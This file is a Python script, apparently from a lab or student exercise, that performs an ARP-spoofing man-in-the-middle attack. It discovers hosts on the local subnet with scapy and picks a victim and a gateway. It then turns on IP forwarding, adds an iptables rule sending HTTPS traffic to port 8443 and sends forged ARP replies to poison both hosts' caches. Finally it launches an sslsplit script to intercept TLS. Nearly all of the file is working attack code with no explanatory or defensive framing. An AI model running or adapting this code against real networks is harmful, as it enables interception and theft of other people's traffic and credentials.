import scapy.all as scapy
import netifaces
import subprocess
import time
import os

def mitm():
    ifaces = netifaces.interfaces()
    #print(interfaces)
    interfaces = [iface for iface in ifaces if iface[:4] == 'enp0']
    #print("enp0: ", enp0)
    
    
    ipv4_info = netifaces.ifaddresses(interfaces[0])[netifaces.AF_INET][0]
    addr, nmask = ipv4_info['addr'], ipv4_info['netmask']
    #print('addr: ', addr)
    #print('nmask: ', nmask)
    cidr = sum([bin(int(x)).count('1') for x in nmask.split('.')])
    
    #print('cidr: ', cidr)
    new_addr = addr + '/' + str(cidr)
    #print('new_addr: ', new_addr)
    #print(ipv4_info)
    
    arp = scapy.ARP(pdst=new_addr)
    broadcast = scapy.Ether(dst='ff:ff:ff:ff:ff:ff')       
    arp_req_bcast = broadcast / arp
    
    result = scapy.srp(arp_req_bcast, timeout=3, verbose=False)[0]
    
    print('Available Devices')
    print('-----------------------------------------')
    print('IP                 MAC                 ')
    print('-----------------------------------------')
    
    arp_table = {}
    gateway_ip = ''
    victim_ip = ''
    
    for sent, received in result:
        print('{received_psrc}           {received_hwsrc}'
              .format(received_psrc=received.psrc, received_hwsrc=received.hwsrc))
        
        if received.psrc != '10.0.2.2' and received.psrc != '10.0.2.3':
            arp_table[received.psrc] = received.hwsrc
            
        if received.psrc != '10.0.2.2' and received.psrc != '10.0.2.3' and received.psrc != '10.0.2.1':
            victim_ip = received.psrc
        elif received.psrc == '10.0.2.1':
            gateway_ip = received.psrc

    os.system("sysctl -w net.ipv4.ip_forward=1")
    os.system("iptables -t nat -F")
    os.system("iptables -t nat -A PREROUTING -p tcp --dport 443 -j REDIRECT --to-ports 8443")
    
    #while True:
    for psrc, hwsrc in arp_table.items():
        if psrc != '10.0.2.1' and psrc == victim_ip:
            packet = scapy.ARP(op=2, pdst=psrc, hwdst=hwsrc, psrc=gateway_ip)
            scapy.send(packet, verbose=False)    
        else:
            packet = scapy.ARP(op=2, pdst=psrc, hwdst=hwsrc, psrc=victim_ip)
            scapy.send(packet, verbose=False)
    
    sp = subprocess.run(["sudo", "sh", "sslsplit.sh"])
    #print("info: ", info)
    
    
    
    
if __name__ == "__main__":
    mitm()

